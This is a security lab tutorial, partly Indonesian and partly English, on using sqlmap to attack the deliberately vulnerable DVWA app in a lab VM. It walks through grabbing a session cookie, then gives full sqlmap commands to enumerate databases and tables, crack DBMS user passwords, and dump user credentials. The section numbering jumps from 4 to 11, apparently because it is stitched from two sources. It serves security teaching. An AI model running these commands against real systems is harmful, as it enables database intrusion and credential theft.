### **Automate SQL Injection with SqlMap**

* Apa itu SQL Injection?
  * SQL injection adalah teknik yang sering digunakan untuk menyerang aplikasi berbasis data.
  * Teknik ini dilakukan dengan menyisipkan sebagian statemen SQL ke dalam field dalam sebuat website untuk menjalankan perintah ke dalam database. SQL Injection adalah teknik yang memanfaatkan kelemahan keamanan dalam software aplikasi. 
* Apa itu sqlmap?
  * Sqlmap adalah alat penetration test open source yang mengotomati proses pendeteksian dan mengeksploitasi SQL injection dan mengambil alih database server. 
* Lab Notes
  * Dalam lesson ini akan dilakukan:
    1. Penggunaan sqlmap untuk mendapatkan informasi:
       1. Daftar username dan password manajemen database
       2. Daftar database
       3. Daftar tabel dalam database tertentu
       4. Daftar usernam dan password dalam tabel database tertentu

| **Section 1: Login ke dalam DVWA** |
| :--- |


1. Buka browser

2. Login ke DVWA

   * Langkah**:**
     1. Buka firefox
     2. Masukkan ip metasploitable, contoh: [http://192.168.56.102/dvwa/login.php](http://192.168.56.102/dvwa/login.php).
     3. Login: admin
     4. Password: password
     5. Klik Login
   * ![](/assets/0. Login.PNG)

| **Section 2: Tetapkan Tingkat Keamanan** |
| :--- |


1. Tetapkan tingkat keamanan DVWA

   * Langkah**:**  
     1. Klik bagian DVWA Security di menu bagian kiri.  
     2. Pilih "low"  
     3. Klik Submit

   * ![](/assets/0. Security.PNG)

| **Section 3: Mendapatkan PHP Cookie** |
| :--- |


1. SQL Injection Menu

   * **Langkah:**
     1. Pilih "SQL Injection" dari menu bagian kiri.
   * ![](/assets/0.1. sql injection .PNG)

2. Pilih Tamper Data \(Jika belum ada add-ons nya , instal terlebih dahulu\)

   * **Langkah:**
     1. Tools --&gt; Tamper Data
   * ![](/assets/Tamper data.PNG)

3. Start Tamper Data

   * **Langkat:**  
     1. Buka halaman sql injection \(pilih pada menu bagian kiri\)  
     2. Klik Start Tamper pada bagian atas kiri

   * ![](/assets/Start tamper.PNG)

4. Basic Injection

   * **Langkah:**  
     1. Masukkan "1" ke text box.  
     2. Klik Submit.

   * ![](http://www.computersecuritystudent.com/SECURITY_TOOLS/DVWA/DVWAv107/lesson7/index.86.jpg)

5. Tamper with request?

   * **Langkah:**  
     1. Pastikan kotak "Continue Tampering?" tidak dicentang.  
     2. Klik Submit

   * ![](/assets/Continue tamper.PNG)

6. Copy Referer URL

   * **Langkah:**  
     1. Pilih GET Request kedua  
     2. Klik kanan Referer Link  
     3. Pilih Copy

   * ![](/assets/Referer.PNG)

7. Buka Notepad

8. Paste Referer URL ke Notepad
9. Copy Cookie Information

   * **Langkah:**  
     1. Right Click on the Cookie line  
     2. Select Copy

   * ![](/assets/Cookie.PNG)

10. Paste Cookie Information ke notepad

| **Section 4: Mendapatkan Current User dan Database Menggunakan SqlMap** |
| :--- |


1. Pastikan sqlmap berjalan

   * **Langkah:**  
     1. Buka terminal  
     2. Tulis perintah:

     ```
        sqlmap
     ```

   * ![](/assets/sqlmap.PNG)

2. Mendapatkan user database DVWA

   * **Langkah:**  
     1. Masukkan perintah sesuai dengan data yang didapat dari langkah sebelumnya:

     ```
        sqlmap -u <referal url> --cookie=<cookie> -b --current-db --current-user
     ```

     * -u, Target URL
     * --cookie, HTTP Cookie header
     * -b, Retrieve DBMS banner
     * --current-db, Retrieve DBMS current database
     * --current-user, Retrieve DBMS current user

   * ![](/assets/sqlmap 1.PNG)

3. Hasil sqlmap

   * Akan terlihat current-user dan current-database
   * ![](/assets/hasil sqlmap.PNG)

| **Section 11: Using SqlMap to Obtain Database Management Username and Password** |
| :--- |


1. Obtain Database Management Username and Password

   * **Notes\(FYI\):**
     * You must have completed [Lesson 4](http://www.computersecuritystudent.com/SECURITY_TOOLS/DVWA/DVWAv107/lesson4/index.html) to see the **db\_hacker **in Step 2.
     * Replace 192.168.1.106 with Fedora's IP address obtained in \(Section 3, Step 3\).
     * Replace \( **lpb5g4uss9kp70p8jccjeks621 **\) with your PHPSESSID obtained from \(Section 9, Step 10\).
   * **Instructions:**
     1. ./sqlmap.py -u "http:// 192.168.1.106 /dvwa/vulnerabilities/sqli/?id=1 & Submit=Submit" --cookie="PHPSESSID= **lpb5g4uss9kp70p8jccjeks621 **; security=low" --string="Surname" --users --password
        * -u, Target URL
        * --cookie, HTTP Cookie header
        * -string, Provide a string set that is always present after valid or invalid query.
        * --users, list database management system users
        * --password, list database management password for system users.
   * ![](http://www.computersecuritystudent.com/SECURITY_TOOLS/DVWA/DVWAv107/lesson7/index.100.jpg)

2. Obtain Database Management Username and Password \(Part 2\)

   * **Instructions:**
     1. Use Dictionary Attack? Y
     2. Dictionary Location?  &lt; Press Enter &gt;
   * **Notes\(FYI\):**  
     1. Notice the password for username db\_hacker was cracked.

   * ![](http://www.computersecuritystudent.com/SECURITY_TOOLS/DVWA/DVWAv107/lesson7/index.101.jpg)

3. Obtain db\_hacker Database Privileges seperti itu

   * **Note\(FYI\):**
     * Replace 192.168.1.106 with Fedora's IP address obtained in \(Section 3, Step 3\).
     * Replace \( **lpb5g4uss9kp70p8jccjeks621 **\) with your PHPSESSID obtained from \(Section 9, Step 10\).
   * **Instructions:**  
     1. ./sqlmap.py -u "http:// 192.168.1.106 /dvwa/vulnerabilities/sqli/?id=1 & Submit=Submit" --cookie="PHPSESSID= **lpb5g4uss9kp70p8jccjeks621 **; security=low" -U db\_hacker --privileges

     * -u, Target URL
     * --cookie, HTTP Cookie header
     * -U, Specify database management user
     * --privileges, list database management system user's privileges

   * ![](http://www.computersecuritystudent.com/SECURITY_TOOLS/DVWA/DVWAv107/lesson7/index.103.jpg)

4. View Results: Obtain db\_hacker Database Privileges

   * **Instructions:**  
     1. Notice that DBMS user "db\_hacker" has administrative privileges  
     2. Notice that "db\_hacker" can log in from anywhere, via the "%" wildcard operator.

   * ![](http://www.computersecuritystudent.com/SECURITY_TOOLS/DVWA/DVWAv107/lesson7/index.104.jpg)

| **Section 12: Obtain a list of all Databases** |
| :--- |


1. Obtain a list of all databases

   * **Notes\(FYI\):**
     1. Obtain the referer link from \(Section 9, Step 10\), which is placed after the "-u" flag below.
     2. Obtain the cookie line from \(Section 9, Step 10\), which is placed after the "--cookie" flag below.
     3. Replace 192.168.1.106 with Fedora's IP address obtained in \(Section 3, Step 3\).
     4. Replace \( **lpb5g4uss9kp70p8jccjeks621 **\) with your PHPSESSID obtained from \(Section 9, Step 10\).
   * **Instructions:**
     1. ./sqlmap.py -u "http:// 192.168.1.106 /dvwa/vulnerabilities/sqli/?id=1 & Submit=Submit" --cookie="PHPSESSID= **lpb5g4uss9kp70p8jccjeks621 **; security=low" --dbs
        * -u, Target URL
        * --cookie, HTTP Cookie header
        * --dbs, List database management system's databases.
   * ![](http://www.computersecuritystudent.com/SECURITY_TOOLS/DVWA/DVWAv107/lesson7/index.98.jpg)

2. Review Results: Obtain a list of all databases

   * **Notes\(FYI\):**  
     1. Notice that sqlmap supplies a list of available databases.

   * ![](http://www.computersecuritystudent.com/SECURITY_TOOLS/DVWA/DVWAv107/lesson7/index.99.jpg)

| **Section 13: Obtain "dvwa" tables and contents** |
| :--- |


1. Obtain "dvwa" tables and contents

   * **Notes\(FYI\):**
     1. Obtain the referer link from \(Section 9, Step 10\), which is placed after the "-u" flag below.
     2. Obtain the cookie line from \(Section 9, Step 10\), which is placed after the "--cookie" flag below.
     3. Replace 192.168.1.106 with Fedora's IP address obtained in \(Section 3, Step 3\).
     4. Replace \( **lpb5g4uss9kp70p8jccjeks621**\) with your PHPSESSID obtained from \(Section 9, Step 10\).
   * **Instructions:**  
     1. ./sqlmap.py -u "http:// 192.168.1.106 /dvwa/vulnerabilities/sqli/?id=1 & Submit=Submit" --cookie="PHPSESSID= **lpb5g4uss9kp70p8jccjeks621 **; security=low" -D dvwa --tables

     * -u, Target URL
     * --cookie, HTTP Cookie header
     * -D, Specify Database
     * --tables, List Database Tables

   * ![](http://www.computersecuritystudent.com/SECURITY_TOOLS/DVWA/DVWAv107/lesson7/index.91.jpg)

2. Viewing "dvwa" tables and content results

   * **Notes\(FYI\):**  
     1. Notice sqlmap listed two tables: guestbook and users.

   * ![](http://www.computersecuritystudent.com/SECURITY_TOOLS/DVWA/DVWAv107/lesson7/index.92.jpg)

3. Obtain columns for table dvwa.users

   * **Notes\(FYI\):**
     1. Obtain the referer link from \(Section 9, Step 10\), which is placed after the "-u" flag below.
     2. Obtain the cookie line from \(Section 9, Step 10\), which is placed after the "--cookie" flag below.
     3. Replace 192.168.1.106 with Fedora's IP address obtained in \(Section 3, Step 3\).
     4. Replace \( **lpb5g4uss9kp70p8jccjeks621 **\) with your PHPSESSID obtained from \(Section 9, Step 10\).
   * **Instructions:**  
     1. ./sqlmap.py -u "http:// 192.168.1.106 /dvwa/vulnerabilities/sqli/?id=1 & Submit=Submit" --cookie="PHPSESSID= **lpb5g4uss9kp70p8jccjeks621 **; security=low" -D dvwa -T users --columns

     * -u, Target URL
     * --cookie, HTTP Cookie header
     * -D, Specify Database
     * -T, Specify the Database Table
     * --columns, List the Columns of the Database Table.

   * ![](http://www.computersecuritystudent.com/SECURITY_TOOLS/DVWA/DVWAv107/lesson7/index.93.jpg)

4. Viewing Results: columns for table dvwa.users

   * **Notes\(FYI\):**  
     1. Notice that there are both a user and password columns in the dvwa.users table.

   * ![](http://www.computersecuritystudent.com/SECURITY_TOOLS/DVWA/DVWAv107/lesson7/index.94.jpg)

5. Obtain Users and their Passwords from table dvwa.users \(Part 1\)

   * **Notes\(FYI\):**
     1. Obtain the referer link from \(Section 9, Step 10\), which is placed after the "-u" flag below.
     2. Obtain the cookie line from \(Section 9, Step 10\), which is placed after the "--cookie" flag below.
     3. Replace 192.168.1.106 with Fedora's IP address obtained in \(Section 3, Step 3\).
     4. Replace \( **lpb5g4uss9kp70p8jccjeks621 **\) with your PHPSESSID obtained from \(Section 9, Step 10\).
   * **Instructions:**  
     1. ./sqlmap.py -u "http:// **192.168.1.106 **/dvwa/vulnerabilities/sqli/?id=1 & Submit=Submit" --cookie="PHPSESSID= **lpb5g4uss9kp70p8jccjeks621 **; security=low" -D dvwa -T users -C user,password --dump

     * -u, Target URL
     * --cookie, HTTP Cookie header
     * -D, Specify Database
     * -C, List user and password columns
     * --dump, Dump table contents

   * ![](http://www.computersecuritystudent.com/SECURITY_TOOLS/DVWA/DVWAv107/lesson7/index.95.jpg)

6. Obtain Users and their Passwords from table dvwa.users \(Part 2\)

   * **Instructions:**  
     1. Do you want to use the LIKE operator? Y  
     2. Recognize possible HASH values? Y  
     3. What's the dictionary location? &lt;Press Enter&gt;  
     4. Use common password suffixes? y

   * ![](http://www.computersecuritystudent.com/SECURITY_TOOLS/DVWA/DVWAv107/lesson7/index.96.jpg)

7. Review Results: Users and their Passwords from table dvwa.users

   * **Notes\(FYI\):**  
     1. Notice how sqlmap nicely displays passwords for each user.

   * ![](http://www.computersecuritystudent.com/SECURITY_TOOLS/DVWA/DVWAv107/lesson7/index.97.jpg)

| **Section 14: Proof of Lab Using John the Ripper** |
| :--- |


1. Proof of Lab
   * **Instructions:**
     1. Bring up a new terminal, see \(Section 7, Step 1\)
     2. cd /pentest/database/sqlmap
     3. find output/\* -print \| xargs ls -l
     4. date
     5. echo "Your Name"
        * Replace the string "Your Name" with your actual name.
        * e.g., echo "John Gray"
   * **Proof of Lab Instructions**
     **:**
     1. Do a  &lt; PrtScn &gt;
     2. Paste into a word document
     3. Upload to Moodle
   * ![](http://www.computersecuritystudent.com/SECURITY_TOOLS/DVWA/DVWAv107/lesson7/index.102.jpg)



